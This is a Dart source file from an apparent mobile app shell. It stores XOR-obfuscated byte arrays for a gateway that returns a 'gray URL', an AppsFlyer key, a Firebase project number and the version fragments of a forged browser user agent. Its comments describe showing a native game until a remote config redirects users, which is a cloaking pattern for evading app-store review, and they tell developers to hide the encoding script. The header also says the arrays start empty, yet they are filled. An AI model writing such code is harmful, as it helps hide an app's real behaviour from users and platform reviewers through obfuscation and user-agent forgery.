import '../cipher/scrambler.dart';

// ============================================================
// VEILED STRINGS — obfuscated endpoints / credentials
// ============================================================
// Every value below is a XOR-scrambled byte list. Plaintext must never
// appear as a string literal in this file. The byte arrays start empty
// on purpose so the shell falls back to the offline path (native game)
// until the manager delivers the config URL, AppsFlyer key and Firebase
// project number.
//
// To populate:
//   1. Feed the plaintext through `disguise()` in a throw-away script.
//   2. Paste the resulting `List<int>` here.
//   3. Do NOT commit the throw-away script.
// ============================================================

// Full POST endpoint the shell hits to receive the gray URL.
const List<int> _packedGateway = <int>[
  230, 30, 74, 215, 45, 31, 145, 159, 216, 29, 238, 166, 170, 138, 135, 102,
  213, 255, 237, 151, 152, 152, 86, 43, 119, 224, 234, 226, 101, 238, 89, 56,
  66, 209,
];

// AppsFlyer Dev Key.
const List<int> _packedAttribution = <int>[
  194, 60, 87, 254, 39, 23, 245, 193, 216, 11, 242, 167, 191, 153, 222, 43,
  210, 229, 246, 202, 188, 192,
];

// Firebase project number / sender id.
const List<int> _packedMessagingProject = <int>[
  191, 91, 9, 150, 104, 23, 134, 134, 130, 78, 164, 234,
];

// Base of the AppsFlyer Get-Conversion-Data endpoint used by the
// organic-retry recheck.
const List<int> _packedGcdBase = <int>[
  230, 30, 74, 215, 45, 31, 145, 159, 213, 27, 249, 161, 171, 147, 197, 114,
  198, 228, 231, 223, 151, 142, 94, 118, 58, 236, 235, 233, 35, 224, 25, 59,
  94, 192, 136, 124, 31, 165, 85, 59, 185, 1, 94, 230, 29, 68, 90,
];

// Chrome major version fragment for the forged UA. Bump per release.
const List<int> _packedChromeVersion = <int>[
  191, 94, 7, 137, 110, 11, 137, 133, 129, 72, 179, 228, 253,
];

// WebKit version fragment for the forged UA.
const List<int> _packedWebkitVersion = <int>[
  187, 89, 9, 137, 109, 19,
];

String unveilGatewayUrl() => revive(_packedGateway);

String unveilAttributionKey() => revive(_packedAttribution);

String unveilMessagingProject() => revive(_packedMessagingProject);

String unveilChromeFragment() => revive(_packedChromeVersion);

String unveilWebkitFragment() => revive(_packedWebkitVersion);

/// Builds the AppsFlyer GCD retry URL. Returns '' if the base has not
/// been packed yet — callers must treat that as "GCD retry unavailable".
String unveilGcdUrl(String appId, String deviceId) {
  final String base = revive(_packedGcdBase);
  if (base.isEmpty) return '';
  final String key = unveilAttributionKey();
  return '$base$appId?devkey=$key&device_id=$deviceId';
}
